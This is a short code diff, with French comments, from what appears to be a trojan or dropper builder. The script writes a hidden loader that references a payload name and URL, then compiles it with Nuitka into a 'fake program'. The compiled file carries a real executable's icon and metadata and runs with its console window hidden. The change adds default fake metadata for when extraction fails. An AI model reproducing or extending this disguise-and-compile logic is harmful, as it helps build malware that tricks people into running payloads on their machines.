@@ -208,7 +208,12 @@ os._exit(0)""".format(name_payload, url_payload, name_payload, name_payload, nam
             fichier.write(loader_hide_file)
             fichier.close()
             ## Compiler le faux programmes
-            fileVersionNumber, companyName, fileDescription = self.ExtractInfo(path_exe)
+            try:
+                fileVersionNumber, companyName, fileDescription = self.ExtractInfo(path_exe)
+            except:
+                fileVersionNumber = "1.0"
+                companyName = "Test"
+                fileDescription = "Fichier test"
             ##--windows-company-name=  --windows-file-version=  --windows-file-description=
             cmd = "py -m nuitka --windows-icon-from-exe={} --windows-file-version=\"{}\" --windows-company-name=\"{}\" --windows-file-description=\"{}\" --windows-disable-console --onefile {}".format(path_exe, fileVersionNumber, companyName, fileDescription, self.pathDirOutput + name_exe_no_ext + ".pyw")
             os.system(cmd)
